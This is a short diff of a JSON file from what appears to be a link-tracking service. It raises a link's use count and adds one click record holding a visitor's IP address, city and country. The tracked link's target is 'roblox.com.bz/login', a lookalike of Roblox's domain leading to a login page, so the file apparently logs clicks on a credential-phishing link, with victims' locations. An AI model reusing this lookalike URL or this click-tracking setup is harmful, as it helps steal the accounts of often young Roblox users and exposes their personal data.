@@ -14161,7 +14161,7 @@
     "targetUrl": "https://roblox.com.bz/login?returnUrl=2671794013209664",
     "createdAt": 1778688484557,
     "status": "active",
-    "useCount": 3,
+    "useCount": 4,
     "createdBy": "admin",
     "clicks": [
       {
@@ -14187,6 +14187,14 @@
         "city": "Houston",
         "flag": "🇺🇸",
         "countryCode": "US"
+      },
+      {
+        "timestamp": 1778691933489,
+        "ip": "104.232.220.55",
+        "country": "Belgium",
+        "city": "Antwerp",
+        "flag": "🇧🇪",
+        "countryCode": "BE"
       }
     ]
   }
